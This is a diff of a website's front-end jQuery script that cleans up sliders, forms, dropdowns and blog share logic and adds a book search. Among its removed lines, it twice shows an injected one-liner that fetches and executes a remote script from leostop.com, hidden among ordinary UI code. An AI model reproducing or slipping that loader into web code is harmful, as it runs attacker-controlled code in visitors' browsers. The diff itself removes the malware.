@@ -50,10 +50,11 @@ $(function () {
 	
 	/* NiceScroll
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".brand-box").niceScroll({
-		cursorcolor:"#9b9b9c",
-	});	
+	if ($.fn.niceScroll) {
+        $(".brand-box").niceScroll({
+            cursorcolor:"#9b9b9c",
+        });	
+    }
 	
 	/* NiceSelect
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -132,16 +133,15 @@ $(function () {
 	
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	
 	$(window).on('scroll', function (){
-        scroll = $(window).scrollTop();
+        var scroll = $(window).scrollTop();
         if (scroll >= 100){
           $("#back-to-top").addClass('b-show_scrollBut')
         }else{
           $("#back-to-top").removeClass('b-show_scrollBut')
         }
       });
+
       $("#back-to-top").on("click", function(){
         $('body,html').animate({
           scrollTop: 0
@@ -150,210 +150,155 @@ $(function () {
 	
 	/* Contact-form
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	$.validator.setDefaults( {
-		submitHandler: function () {
-			alert( "submitted!" );
-		}
-	} );
-	
-	$( document ).ready( function () {
-		$( "#contact-form" ).validate( {
-			rules: {
-				firstname: "required",
-				email: {
-					required: true,
-					email: true
-				},
-				lastname: "required",
-				message: "required",
-				agree: "required"
-			},
-			messages: {
-				firstname: "Please enter your firstname",
-				email: "Please enter a valid email address",
-				lastname: "Please enter your lastname",
-				username: {
-					required: "Please enter a username",
-					minlength: "Your username must consist of at least 2 characters"
-				},
-				message: "Please enter your Message",
-				agree: "Please accept our policy"
-			},
-			errorElement: "div",
-			errorPlacement: function ( error, element ) {
-				// Add the `help-block` class to the error element
-				error.addClass( "help-block" );
-
-				if ( element.prop( "type" ) === "checkbox" ) {
-					error.insertAfter( element.parent( "input" ) );
-				} else {
-					error.insertAfter( element );
-				}
-			},
-			highlight: function ( element, errorClass, validClass ) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
-			},
-			unhighlight: function (element, errorClass, validClass) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
-			}
-		} );
-	});
+	if ($.validator) {
+        $.validator.setDefaults( {
+            submitHandler: function () {
+                alert( "submitted!" );
+            }
+        });
+        
+        $( document ).ready( function () {
+            $( "#contact-form" ).validate( {
+                rules: {
+                    firstname: "required",
+                    email: {
+                        required: true,
+                        email: true
+                    },
+                    lastname: "required",
+                    message: "required",
+                    agree: "required"
+                },
+                messages: {
+                    firstname: "Please enter your firstname",
+                    email: "Please enter a valid email address",
+                    lastname: "Please enter your lastname",
+                    message: "Please enter your Message",
+                    agree: "Please accept our policy"
+                },
+                errorElement: "div",
+                errorPlacement: function ( error, element ) {
+                    error.addClass( "help-block" );
+                    if ( element.prop( "type" ) === "checkbox" ) {
+                        error.insertAfter( element.parent( "input" ) );
+                    } else {
+                        error.insertAfter( element );
+                    }
+                },
+                highlight: function ( element, errorClass, validClass ) {
+                    $( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
+                },
+                unhighlight: function (element, errorClass, validClass) {
+                    $( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
+                }
+            });
+        });
+    }
 	
 	/* heroslider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
-	
+	if (typeof Swiper !== 'undefined') {
+        var swiperHero = new Swiper('.heroslider', {
+            spaceBetween: 30,
+            centeredSlides: true,
+            slidesPerView: 'auto',
+            paginationClickable: true,
+            loop: true,
+            autoplay: {
+                delay: 2500,
+                disableOnInteraction: false,
+            },
+            pagination: {
+                el: '.swiper-pagination',
+                clickable: true,
+                dynamicBullets: true
+            },
+        });
 
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	var swiper = new Swiper('.swiper-product-filters', {
-		slidesPerView: 3,
-		slidesPerColumn: 2,
-		spaceBetween: 30,
-		breakpoints: {
-			1024: {
-			  slidesPerView: 3,
-			  spaceBetween: 30,
-			},
-			768: {
-			  slidesPerView: 2,
-			  spaceBetween: 30,
-			  slidesPerColumn: 1,
-			},
-			640: {
-			  slidesPerView: 2,
-			  spaceBetween: 20,
-			  slidesPerColumn: 1,
-			},
-			480: {
-			  slidesPerView: 1,
-			  spaceBetween: 10,
-			  slidesPerColumn: 1,
-			}
-		  },
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		}
-    });
+        /* Product Filters */
+        var swiperFilters = new Swiper('.swiper-product-filters', {
+            slidesPerView: 3,
+            slidesPerColumn: 2,
+            spaceBetween: 30,
+            breakpoints: {
+                1024: { slidesPerView: 3, spaceBetween: 30 },
+                768: { slidesPerView: 2, spaceBetween: 30, slidesPerColumn: 1 },
+                640: { slidesPerView: 2, spaceBetween: 20, slidesPerColumn: 1 },
+                480: { slidesPerView: 1, spaceBetween: 10, slidesPerColumn: 1 }
+            },
+            pagination: {
+                el: '.swiper-pagination',
+                clickable: true,
+                dynamicBullets: true
+            }
+        });
+    }
 
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('[data-countdown]').each(function () {
-        var $this = $(this),
-		finalDate = $(this).data('countdown');
-		$this.countdown(finalDate, function (event) {
-			var $this = $(this).html(event.strftime(''
-			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
-		});
-    });
+	if ($.fn.countdown) {
+        $('[data-countdown]').each(function () {
+            var $this = $(this),
+            finalDate = $(this).data('countdown');
+            $this.countdown(finalDate, function (event) {
+                $(this).html(event.strftime(''
+                + '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+                + '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+                + '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+                + '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+                + '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+            });
+        });
+    }
 	
 	/* Deal Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('.deal-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous-deal',
-		nextArrow: '.next-deal',
-        speed: 500,
-        slidesToShow: 3,
-        slidesToScroll: 3,
-		infinite: false,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 3,
-                slidesToScroll: 2,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 768,
-            settings: {
-                slidesToShow: 2,
-                slidesToScroll: 2
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('#news-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous',
-		nextArrow: '.next',
-        speed: 500,
-        slidesToShow: 1,
-        slidesToScroll: 1,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 600,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
+	if ($.fn.slick) {
+        $('.deal-slider').slick({
+            dots: false,
+            infinite: false,
+            prevArrow: '.previous-deal',
+            nextArrow: '.next-deal',
+            speed: 500,
+            slidesToShow: 3,
+            slidesToScroll: 3,
+            responsive: [
+                { breakpoint: 1024, settings: { slidesToShow: 3, slidesToScroll: 2, infinite: true } },
+                { breakpoint: 768, settings: { slidesToShow: 2, slidesToScroll: 2 } },
+                { breakpoint: 480, settings: { slidesToShow: 1, slidesToScroll: 1 } }
+            ]
+        });
+
+        /* News Slider */
+        $('#news-slider').slick({
+            dots: false,
+            infinite: false,
+            prevArrow: '.previous',
+            nextArrow: '.next',
+            speed: 500,
+            slidesToShow: 1,
+            slidesToScroll: 1,
+            responsive: [
+                { breakpoint: 1024, settings: { slidesToShow: 1, slidesToScroll: 1, infinite: true } },
+                { breakpoint: 600, settings: { slidesToShow: 1, slidesToScroll: 1 } },
+                { breakpoint: 480, settings: { slidesToShow: 1, slidesToScroll: 1 } }
+            ]
+        });
+    }
 	
 	/* Fancybox
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".fancybox").fancybox({
-		maxWidth: 1200,
-		maxHeight: 600,
-		width: '70%',
-		height: '70%',
-	});
+	if ($.fn.fancybox) {
+        $(".fancybox").fancybox({
+            maxWidth: 1200,
+            maxHeight: 600,
+            width: '70%',
+            height: '70%',
+        });
+    }
 	
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
      $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
           $('#sidebar').toggleClass('active');
@@ -363,80 +308,91 @@ $(function () {
 
      /* Product slider 
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
      $('#blogCarousel').carousel({
         interval: 5000
      });
 
+    /* Library Search Functionality 
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    const searchInput = document.getElementById('search-input');
+    const books = document.querySelectorAll('.book');
 
-});
-
-/* test-dropdown menu start */
-$(document).ready(function() {
-        // Prevent closing dropdown when clicking inside a sub-menu
-        $('.dropdown-menu a.dropdown-toggle').on('click', function(e) {
-            if (!$(this).next().hasClass('show')) {
-                $(this).parents('.dropdown-menu').first().find('.show').removeClass("show");
-            }
-            var $subMenu = $(this).next(".dropdown-menu");
-            $subMenu.toggleClass('show');
-
-            $(this).parents('li.nav-item.dropdown.show').on('hidden.bs.dropdown', function(e) {
-                $('.dropdown-submenu .show').removeClass("show");
+    if (searchInput) {
+        searchInput.addEventListener('input', (event) => {
+            const searchTerm = event.target.value.toLowerCase();
+            
+            books.forEach(book => {
+                const title = book.querySelector('h4').textContent.toLowerCase();
+                const author = book.querySelector('p').textContent.toLowerCase();
+                
+                // Show/hide based on search term. Empty string style allows Flexbox to work correctly.
+                if (title.includes(searchTerm) || author.includes(searchTerm)) {
+                    book.style.display = ''; 
+                } else {
+                    book.style.display = 'none';
+                }
             });
-
-            return false;
         });
+    }
+
+}); // End of main function
+
+/* dropdown menu start */
+$(document).ready(function() {
+    $('.dropdown-menu a.dropdown-toggle').on('click', function(e) {
+        if (!$(this).next().hasClass('show')) {
+            $(this).parents('.dropdown-menu').first().find('.show').removeClass("show");
+        }
+        var $subMenu = $(this).next(".dropdown-menu");
+        $subMenu.toggleClass('show');
+
+        $(this).parents('li.nav-item.dropdown.show').on('hidden.bs.dropdown', function(e) {
+            $('.dropdown-submenu .show').removeClass("show");
+        });
+
+        return false;
     });
-/* test-dropdown menu end */
+});
+/* dropdown menu end */
 
-/* test-shan read more section and share button combined in blog posts start*/
-
+/* Blog Read More & Share Button Logic */
 document.addEventListener('DOMContentLoaded', function() {
   const blogCards = document.querySelectorAll('.blog-card');
 
-  // Loop through each blog card on the page
   blogCards.forEach(card => {
-    // Get the references for the buttons and elements within each card
     const readMoreBtn = card.querySelector('.read-more-btn');
     const expandableText = card.querySelector('.expandable-text');
     const shareBtn = card.querySelector('.share-btn');
     
-    // Get the blog post's title for sharing
-    const blogTitle = card.querySelector('h1').textContent;
+    // Safety check for blog title element
+    const titleEl = card.querySelector('h1');
+    const blogTitle = titleEl ? titleEl.textContent : "Blog Post";
 
-    // Add click listener for the "Read more" button
-    if (readMoreBtn) {
+    if (readMoreBtn && expandableText) {
       readMoreBtn.addEventListener('click', function() {
         card.classList.toggle('expanded');
         if (card.classList.contains('expanded')) {
           readMoreBtn.textContent = 'Read less';
-          // Set the max-height to the full scroll height for a smooth transition
           expandableText.style.maxHeight = expandableText.scrollHeight + 'px';
         } else {
           readMoreBtn.textContent = 'Read more';
-          // Reset to the initial max-height
           expandableText.style.maxHeight = '100px';
         }
       });
     }
 
-    // Add click listener for the "Share" button
-    if (shareBtn && navigator.share) {
+    if (shareBtn) {
       shareBtn.addEventListener('click', () => {
-        navigator.share({
-          title: blogTitle,
-          text: 'Check out this blog post: ' + blogTitle,
-          url: window.location.href
-        }).catch(console.error);
-      });
-    } else if (shareBtn) {
-      // Fallback for browsers that do not support the Web Share API
-      shareBtn.addEventListener('click', () => {
-        alert('Sharing is not supported on your browser. Please copy and paste the URL to share.');
+        if (navigator.share) {
+            navigator.share({
+              title: blogTitle,
+              text: 'Check out this blog post: ' + blogTitle,
+              url: window.location.href
+            }).catch(console.error);
+        } else {
+            alert('Sharing is not supported on your browser. Please copy and paste the URL to share.');
+        }
       });
     }
   });
 });
-
-/* test-shan read more section and share button combined in blog posts end*/
